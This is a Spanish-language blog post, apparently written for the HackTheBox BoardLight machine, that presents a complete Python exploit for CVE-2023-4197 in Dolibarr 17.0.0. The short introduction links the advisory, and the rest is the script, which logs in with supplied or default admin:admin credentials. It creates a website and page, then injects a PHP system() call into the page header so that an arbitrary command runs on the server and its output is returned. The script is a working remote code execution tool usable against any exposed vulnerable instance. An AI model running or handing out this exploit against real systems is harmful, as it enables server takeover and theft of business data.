---

title: BoardLightHTB 
date: 2024-05-26 07:03 +0800
categories: [Scripts]
tags: [Scripts, HTB]
pin: true
image:
  path: /assets/img/commons/BoardLightHTB/bannerBoardLightHTB.png
  width: 66
  height: 40
  alt: BoardLightHTB
---

Script para ejecutar un `RCE HTML` en la máquina BoardLight de hackthebox en el software **Dolibarr**.

Esta vulnerabilidad se acontece en la ruta `/website/index.php`, el script puede generar una nueva web y páginas con un usuario autentificado. Después se puede injectar código en la **cabecera HTML** mediante solicitudes **POST**. 
Para ejecutar el código se accede a la web creada en la ruta `/public/website/index.php`


- Referencias:
    - [CVE-2023-4197](https://starlabs.sg/advisories/23/23-4197/) 


<figure style="text-align: center;">
  <img src="/assets/img/commons/BoardLightHTB/BoardLightHTB.png" alt="VMnet_lab">
  <figcaption style="font-style: italic; font-size: smaller;"></figcaption>
</figure>

-----------------------------------------------------------------------------------------------

```python
#!/usr/bin/env python3
import os
import re
import requests
import sys
import uuid
requests.packages.urllib3.disable_warnings()
s = requests.Session()
def check_args():
    global target, username, password, cmd
    print("\nCVE-2023-4197 -> Dolibarr 17.0.0 Command injection BoardLight.HTB")
    print("\tCredenciales por defecto -> admin:admin\n")
    if len(sys.argv) != 5:
        print("[!] Uso: python3 {} http://IP User Pass CommandRCE".format(sys.argv[0]))
        sys.exit(1)
    target = sys.argv[1].strip("/")
    username = sys.argv[2]
    password = sys.argv[3]
    cmd = sys.argv[4]
def authenticate():
    global s, csrf_token
    res = s.get(f"{target}/", verify=False)
    csrf_token = re.search("\"anti-csrf-newtoken\" content=\"(.+)\"", res.text).group(1).strip()
    data = {
        "token": csrf_token,
        "username": username,
        "password": password,
        "actionlogin": "login"
    }
    res = s.post(f"{target}/", data=data, verify=False)
    if "Logout" not in res.text:
        print("[!] Error de autenticación")
        sys.exit(1)
    else:
        print("[+] Autenticación con éxito!")
def rce():
    website_name = uuid.uuid4().hex
    data = {
        "WEBSITE_REF": website_name,
        "token": csrf_token,
        "action": "addsite",
        "WEBSITE_LANG": "en",
        "addcontainer": "create"
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if f"Website - {website_name}" not in res.text:
        print("[!] Error al crear WEB")
        sys.exit(1)
    else:
        print(f"[+] Web creada con éxito: \"{website_name}\"!")
    webpage_name = uuid.uuid4().hex
    data = {
        "website": website_name,
        "token": csrf_token,
        "action": "addcontainer",
        "WEBSITE_TYPE_CONTAINER": "page",
        "WEBSITE_TITLE": "x",
        "WEBSITE_PAGENAME": webpage_name
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if f"Contenair \\'{webpage_name}\\' added" not in res.text:
        print("[!] Error al crear pagina web")
        sys.exit(1)
    else:
        print(f"[+] Pagina web creada: \"{webpage_name}\"!")
    webpage_id = re.search(f"<option value=\"(.+)\" .+{webpage_name}", res.text).group(1).strip()
    data = {
        "website": website_name,
        "WEBSITE_PAGENAME": webpage_name,
        "pageid": webpage_id,
        "token": csrf_token,
        "action": "updatemeta",
        "htmlheader": f"<?PHP echo system('{cmd}');?>",
        "htmlbody": f"<section id=\"mysection1\" contenteditable=\"true\">{cmd}</section>"
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if "Saved" not in res.text:
        print("[!] Error al modificar la pagina WEB")
        sys.exit(1)
    else:
        print("[+] Pagina WEB modificada!")
    print(f"\n[+] RCE: {target}/public/website/index.php?website={website_name}&pageref={webpage_name}\n")
    res = s.get(f"{target}/public/website/index.php?website={website_name}&pageref={webpage_name}", verify=False)
    if res.status_code != 200:
        print("[!] Web sin aceso!")
        sys.exit(1)
    else:
        output = re.findall("block -->\n(.+?)</head>", res.text, re.MULTILINE | re.DOTALL)[0].strip()
        print(f"\nRCE -> {output}")
def main():
    check_args()
    authenticate()
    rce()
if __name__ == "__main__":
    main()
```
